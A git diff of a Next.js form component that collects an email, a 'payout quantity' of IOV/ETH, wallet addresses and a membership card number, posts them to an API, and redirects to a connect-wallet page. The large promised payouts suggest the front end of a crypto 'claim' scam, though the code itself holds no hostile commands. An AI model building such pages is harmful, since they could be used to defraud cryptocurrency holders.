@@ -1,27 +1,71 @@
 "use client";
 import { useState } from "react";
-import { redirect } from "next/navigation";
+import { useRouter } from "next/navigation";
 import { FormEvent } from "react";
 import { toast } from "sonner";
+import { makeApiRequest } from "@/lib/apiUtils";
 
 //Import Icons
 import { GoDotFill } from "react-icons/go";
 
+type InitialProps = {
+  email: string,
+  claimAmount: string,
+  iovWalletAddress: string,
+  wallet: string,
+  membershipCard?: string,
+  ethereumAddress: string
+}
+const initialState:InitialProps = {
+  email: "",
+  claimAmount: "",
+  iovWalletAddress: "",
+  wallet: "",
+  membershipCard: "",
+  ethereumAddress: ""
+}
+
 const Form = () => {
-  //State for redirecting
-  const [isTrue, setIsTrue] = useState<boolean>(false);
-  
+  const router = useRouter()
+  const [state, setState] = useState(initialState)
+  const [loading, setLoading] = useState<boolean>(false)
+  //Function for the State Changing
+  const handleChange = (event: any) => {
+    setState({...state, [event.target.name]: event.target.value})
+}
+//Function for the Form Reset
+const handleFormReset = () => {
+  setState(initialState);
+};
+
   //On Submit Function
   const onSubmit = (e: FormEvent) => {
     e.preventDefault();
-    toast.success(
-      "Your Response Was Collected Successfully. You will be Redirected"
-    );
-    setIsTrue(true);
+    setLoading(true)
+    console.log(state)
+    makeApiRequest("/firstForm", "post", state, {
+      onSuccess: () => {
+        //Handle Success
+        setLoading(false);
+        toast.success("Your Response Was Collected Successfully. You will be Redirected.");
+        router.push("/connect-wallet");
+      },
+      onError: (error : any) => {
+        //Handle Error
+        handleFormReset()
+        setLoading(false);
+        if (error) {
+          if (error === "Missing Fields") {
+            toast.error("Please Fill In All The Details");
+          } else {
+            toast.error("Your Response Wasn't Submitted, Please Try Again Later");
+          }
+        }
+      }
+    })
   };
-  //Submits the form and redirects the person to the connect wallet page
-  isTrue && redirect("/connect-wallet");
-  //TODO: Add the required attribute to the needed form fields, and also check it via their states before submitting.
+
+
   return (
     <main>
       <div className="border-b border-slate-700">
@@ -60,9 +104,12 @@ const Form = () => {
             Email
           </label>
           <input
+            required
             type="email"
             name="email"
             id="email"
+            onChange={handleChange}
+            value = {state.email}
             className="bg-inherit w-full max-w-[40rem] border border-textLightBlue rounded-lg focus:outline-none p-3 placeholder:text-xs md:placeholder:text-md"
             placeholder="Enter Your Email Address"
           />
@@ -71,7 +118,8 @@ const Form = () => {
           <label className="cursor-pointer" htmlFor="claimAmount">
             Payout Quantity
           </label>
-        <select name="claimAmount" id="claimAmount" className="bg-inherit border border-textLightBlue rounded-lg focus:outline-none p-3">
+        <select required name="claimAmount" id="claimAmount" className="bg-inherit border border-textLightBlue rounded-lg focus:outline-none p-3" onChange={handleChange} value={state.claimAmount}>
+          <option value="">Select Payout Quantity</option>
           <option value="25000000IOV/25ETH">25000000IOV/25ETH</option>
           <option value="50000000IOV/48ETH">50000000IOV/48ETH</option>
           <option value="75000000IOV/119ETH">75000000IOV/119ETH</option>
@@ -83,6 +131,9 @@ const Form = () => {
             IOV Wallet Address
           </label>
           <input
+            required
+            onChange={handleChange}
+            value={state.iovWalletAddress}
             type="text"
             name="iovWalletAddress"
             id="iovWalletAddress"
@@ -94,7 +145,8 @@ const Form = () => {
           <label className="cursor-pointer" htmlFor="wallet">
             IOV Claim Wallet
           </label>
-          <select name="wallet" id="wallet" className="bg-inherit border border-textLightBlue rounded-lg focus:outline-none p-3">
+          <select required name="wallet" id="wallet" className="bg-inherit border border-textLightBlue rounded-lg focus:outline-none p-3" onChange={handleChange} value={state.wallet}>
+            <option value="">Select Wallet</option>
             <option value="Trust Wallet">Trust Wallet</option>
             <option value="Metamask">Metamask</option>
             <option value="Atomic Wallet">Atomic Wallet</option>
@@ -105,6 +157,8 @@ const Form = () => {
             Royal Membership Card (Optional)
           </label>
           <input
+            onChange={handleChange} 
+            value={state.membershipCard}
             type="text"
             name="membershipCard"
             id="membershipCard"
@@ -117,6 +171,9 @@ const Form = () => {
             Ethereum Address
           </label>
           <textarea
+            required
+            onChange={handleChange}
+            value={state.ethereumAddress}
             name="ethereumAddress"
             id="ethereumAddress"
             className="resize-none bg-inherit w-full max-w-[40rem] border border-textLightBlue rounded-lg focus:outline-none p-3 placeholder:text-xs md:placeholder:text-md"
@@ -126,7 +183,7 @@ const Form = () => {
         <div className="mt-4 w-full max-w-[40rem]">
           <input
             type="submit"
-            value="Next Step"
+            value={loading ? "Sending..." : "Next Step"}
             className="bg-accentBlue text-center w-full py-3 border-2 font-bold border-accentBlue hover:bg-inherit duration-500 hover:text-accentBlue cursor-pointer rounded-lg"
           />
         </div>
